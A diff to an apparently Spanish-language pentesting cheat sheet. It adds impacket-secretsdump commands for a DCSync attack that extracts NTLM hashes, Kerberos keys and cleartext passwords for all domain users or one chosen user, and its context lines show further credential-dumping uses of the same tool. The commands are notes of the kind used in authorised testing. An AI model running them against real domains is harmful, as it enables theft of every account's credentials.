@@ -5,6 +5,16 @@
 impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP-TARGET>
 ```
 
+#### Extrar Hashes NTLM y kerberos keys  - cunaod se tiene un usuario que pertenece al grupo DCSync (el parametro -just-dc creará 3 archivos: una que contiene los hashs NTLM, una que contiene las teclas Kerberos, y otra que contendría contraseñas de texto claros de la NTDS)
+```
+impacket-secretsdump -outputfile hashes -just-dc <DOMAIN>/<USER>@<IP>
+```
+
+#### Extrar Hashes NTLM y kerberos keys de un usuario en especifico - cunaod se tiene un usuario que pertenece al grupo DCSync
+```
+impacket-secretsdump -outputfile hashes -just-dc-user <USERNAME-TO-EXTRACT> <DOMAIN>/<USER>@<IP>
+```
+
 #### Extraer Hashes de archivos ntds.dit
 ```
 impacket-secretsdump.py -ntds <FILE.dit> -system <FILE-SYSTEM> LOCAL
